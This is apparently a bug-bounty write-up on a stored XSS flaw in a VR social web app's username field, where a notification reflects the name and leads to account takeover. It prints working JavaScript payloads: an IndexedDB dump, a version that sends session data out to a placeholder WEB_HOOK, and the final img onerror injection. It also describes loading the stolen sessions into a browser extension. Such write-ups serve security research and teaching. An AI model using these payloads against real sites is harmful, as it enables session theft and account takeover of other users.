# :globe_with_meridians: Stored Xss To Account Takeover Going Beyond Document Cookie 970E42362F43

---

Getting Into the Target

Let’s dive into the main web application. The target was a game like socializing web application which provides a VR like functionality to roam around and play with others in a specific world / space. A space can hold 15 users at a time.

Main Issue

The user’s name was vulnerable to Stored XSS and didn’t have any character limitation on it. When a user adds any asset like images, video in the space a notification pops up on the top of the screen saying : “User A just added a video to this space. Check it out! ”. That reflection of the name was the vulnerable reflection point and when any asset is added the script in the name gets executed due to the appearance of the notification.

Confusion

My first basic payload was <script>alert()</script> which was reflecting but wasn’t getting executed because the input was being added to innerHtml, dynamically via javascript. But was able to make a popup only using <img src=x onerror=alert(document.cookie)>. But …

As you can see, these were the cookies that popped up, and I can surely tell these are not something that is used for session identification purpose.

Investigation

So how is the Web Application identifying which user is logged in? So let’s come to the discussion where session information are usually stored?

The most common answer to this will be in the cookies. But No, as you can see they didn’t use cookies to hold the user session. And another commonly used storage is the Local Storage of the browser which can be easily accessed by window.localStorage along with JSON.stringify :

But in my target they also didn’t use the Local Storage, rather they used [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API) to hold the session information of the user. Let us get introduced with IndexedDB then:

>

IndexedDB is a low-level API for client-side storage of significant amounts of structured data, including files/blobs. This API uses indexes to enable high-performance searches of this data. While [Web Storage](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) is useful for storing smaller amounts of data, it is less useful for storing larger amounts of structured data. IndexedDB provides a solution.
IndexedDB is a database that is built into a browser, much more powerful than `localStorage`.

Stores almost any kind of values by keys, multiple key types.

Supports transactions for reliability.

Supports key range queries, indexes.

Can store much bigger volumes of data than `localStorage`.

Payload Crafting

So when I was confirm that they used IndexedDB from the “Application” Tab of the browser.

I had to read the documentation to know about it more and after trying a lot I was unable to dump any data out of it using JS (This is what happens when you do not have enough experience with development).

## Get SMHTahsin33’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Then spending some more time on it and looking for the ways to dump the data from the IndexedDB I stumbled upon this webpage by OWASP :

Here they provided all the ways of testing browser storage and I found this code snippet inside the WSTG — v4.2

Print All the Contents of IndexedDB:

```
const dumpIndexedDB = dbName => {
const DB_VERSION = 1;
const req = indexedDB.open(dbName, DB_VERSION);
req.onsuccess = function() {
const db = req.result;
const objectStoreNames = db.objectStoreNames || []; console.log(`[*] Database: ${dbName}`); Array.from(objectStoreNames).forEach(storeName => {
const txn = db.transaction(storeName, 'readonly');
const objectStore = txn.objectStore(storeName); console.log(`\t[+] ObjectStore: ${storeName}`); // Print all entries in objectStore with name `storeName`
objectStore.getAll().onsuccess = event => {
const items = event.target.result || [];
items.forEach(item => console.log(`\t\t[-] `, item));
};
});
};
};indexedDB.databases().then(dbs => dbs.forEach(db => dumpIndexedDB(db.name)));
```

When I pasted this in the console, to my surprise it worked out :)

But as I have to inject it inside onerror event handler, this was too big and was with spaces and made look messed up. Then I used [JS Minifier](https://www.toptal.com/developers/javascript-minifier) to minify the code into this and to make the spaces not an issue I modified the whole into a function :

```
(function(){const dumpIndexedDB=a=>{let b=indexedDB.open(a,1);b.onsuccess=function(){let c=b.result,d=c.objectStoreNames||[];console.log(`[*] Database: ${a}`),Array.from(d).forEach(a=>{let b=c.transaction(a,"readonly"),d=b.objectStore(a);console.log(`	[+] ObjectStore: ${a}`),d.getAll().onsuccess=a=>{let b=a.target.result||[];b.forEach(a=>console.log("\\t\\t[-] ",a))}})}};indexedDB.databases().then(a=>a.forEach(a=>dumpIndexedDB(a.name)))})()
```

Data Exfiltration

This was working fine and the thing left was to exfiltrate the dumped data into my own server. For that the payload needed more modifications and as I told before I didn’t have any experience with JS before, I ended up pinging [Rayhan Ahmed](https://twitter.com/Rayhan0x01) brother and thanks to him, he modified the payload for me which was perfect for the data exfiltration:

```
indexedDB.databases().then((e=>e.forEach((e=>(e=>{let o=indexedDB.open(e,1);o.onsuccess=function(){let t=o.result,n=t.objectStoreNames||[];(new Image).src='WEB_HOOK?exfil=database:'+encodeURIComponent(e),Array.from(n).forEach((e=>{let o=t.transaction(e,'readonly').objectStore(e);console.log(`[+] ObjectStore:${e}`),o.getAll().onsuccess=e=>{(e.target.result||[]).forEach((e=>{(new Image).src="WEB_HOOK?exfil=table:'+JSON.stringify(e)}))}}))}})(e.name)))));
```

I just replaced the WEB_HOOK with my Webhook URL and injected the payload again. The Final Payload:

```
<img src=x onerror="(function(){indexedDB.databases().then((e=>e.forEach((e=>(e=>{let o=indexedDB.open(e,1);o.onsuccess=function(){let t=o.result,n=t.objectStoreNames||[];(new Image).src='WEB_HOOK?exfil=database:'+encodeURIComponent(e),Array.from(n).forEach((e=>{let o=t.transaction(e,'readonly').objectStore(e);console.log(`[+] ObjectStore:${e}`),o.getAll().onsuccess=e=>{(e.target.result||[]).forEach((e=>{(new Image).src='WEB_HOOK?exfil=table:'+JSON.stringify(e)}))}}))}})(e.name)))))})()">
```

When I reproduced the steps again, the notification popped up in every users browser and the payload got executed leading their session being logged to my Webhook. You can also use any other out of band service including your VPS for the data exfiltration:

Successfully stole the victim’s session, then all I had to do was copy this and paste it replacing my own session information using [IndexedDbEdit](https://chrome.google.com/webstore/detail/indexeddbedit/npjecebdjnmlolggnoajngnlodhgpfac?hl=en-GB)chrome extension:

After clicking the save icon, the browser reloaded and I was successfully inside the victim’s dashboard :)

Thanks for reading. Hope you enjoyed reading the writeup, Don’t forget to share!

See ya!

---
